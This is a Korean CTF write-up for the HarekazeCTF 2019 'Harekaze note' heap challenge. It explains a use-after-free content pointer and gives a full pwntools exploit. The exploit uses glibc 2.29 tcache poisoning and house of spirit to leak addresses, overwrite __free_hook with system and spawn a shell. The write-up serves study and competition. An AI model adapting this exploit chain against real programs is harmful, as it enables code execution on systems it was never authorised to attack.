---
title: HarekazeCTF 2019 - Harekaze note
date: 2019-05-19 15:00:53
categories:
- Heap Exploit
- CTF write up
tags:
- Tcache Poisoning
- Glibc 2.29 heap
- Tcache House of Spirit
---


```c
1. Create note
2. Write content
3. Show content
4. Delete note
Choice: 
```

계속 워게임을 풀고 있기도 하고,, 요즘 ctf에서 부진한 성적ㅠ 때문에 글을 안쓰다가 다시 쓴다

Glibc 2.29 에서 tcache poisoning 이다.

2.29 는 처음이라 신기했당

tcache 를 free 하면 bk 부분에 tcache 주소를 넣어주고 이걸로 double free 를 체크한다

그래서 그냥 bk 부분을 overwrite 할 수 있으면 익스할 수 있다!



## Vuln

```c
struct note
{
  char title[16];
  __int64 pre;
  __int64 next;
  __int64 *content;
};
```

이런 unlink 구조인데, free 하고 memset 을 하지 않기 때문에 content 부분에서 arbitary read 를 할 수 있다.

구조체를 관리하는 부분에서 bss 영역 주소도 넣어주기 때문에 got로 libc leak 까지 하면된다.

또 delete 할 때, 이 content 부분을 사용하기 때문에 tcache poisoning + house of spirit 을 이용해 bk 덮고 hook 덮으면 된다.



## Exploit

```python
from pwn import *

w = process("./note")
#w = remote("problem.harekaze.com",20003)
ww = ELF("./note_libc.so.6")

sla = w.sendlineafter
sl = w.sendline
sa = w.sendafter

def create(title):
    sla(":","1")
    sla(":",title)

def write(title,size,cont):
    sla(":","2")
    sla(":",title)
    sla(":",str(size))
    sla("Content:",cont)

def show(title):
    sla(":","3")
    sla(":",title)

def delete(title):
    sla(":","4")
    sla(":",title)

for i in range(4):
    create(str(i))

for i in range(4):
    write(str(i),0x28,"w"*0x27)

delete(str(1))
delete(str(2))

create("w")
show("w")

heap = u64(w.recvline()[1:7].ljust(8,"\x00"))
log.info(hex(heap))

for i in range(6):
    create(str(i)*4)

for i in range(3,6):
    write(str(i)*4,0x28,p64(heap-0x20)*5)

delete("4"*4)
delete("5"*4)

create("a")
create("l")

show("l")
w.recvuntil("content: ")

code = u64(w.recvline()[:6].ljust(8,"\x00"))
log.info(hex(code))

free_got = code-0x108

for i in range(10):
    create(str(i)*8)

for i in range(2,8):
    if i == 7:
		write(str(i)*8,0x28,str(i)*0x20+p64(heap+0x4a0))
    else:
        write(str(i)*8,0x28,str(i)*0x20+p64(free_got))

delete("3"*8)
delete("4"*8)

create("l"*8)
create("y"*8)

show("y"*8)
w.recvuntil("content: ")

libc = u64(w.recvline()[:6].ljust(8,"\x00"))-ww.symbols['free']
log.info(hex(libc))

delete("6"*8)
delete("5"*8)
delete("7"*8)

create("wally")
create("wally0813")

write("8"*8,0x28,p64(0x31)*4)

delete("wally")

create("/bin/sh")

write("9"*8,0x28,p64(0xdeadbeef)+p64(0x31)+p64(heap+0x2a0+0x30+0x60)+p64(0))

system = libc+ww.symbols['system']
hook = libc+ww.symbols['__free_hook']

create(p64(hook))
create(p64(hook))
create(p64(hook))
create(p64(system))

delete("/bin/sh")

w.interactive()

```



![KakaoTalk_20190519_011947166](https://user-images.githubusercontent.com/36659181/57976904-a3fb1d80-7a26-11e9-8925-0929f168d045.png)

퍼블 못따서 아쉽다ㅠㅠ!
